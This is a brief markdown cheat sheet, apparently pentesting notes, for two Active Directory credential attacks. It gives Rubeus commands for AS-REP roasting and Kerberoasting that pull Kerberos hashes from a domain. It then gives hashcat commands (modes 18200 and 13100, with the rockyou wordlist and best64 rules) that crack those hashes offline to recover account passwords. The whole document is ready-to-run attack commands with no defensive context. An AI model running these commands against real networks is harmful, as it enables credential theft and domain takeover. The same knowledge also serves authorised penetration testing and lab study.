# AS-REP Roasting

```powershell
.\Rubeus.exe asreproast /nowrap
```
> `/nowrap` prevents newlines from being added to the hash

Copying the resulting hash and cracking with hashcat
```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

# Kerberoasting (TGS-REP)
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Using hashcat to crack a TGS-REP hash (13100)
```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
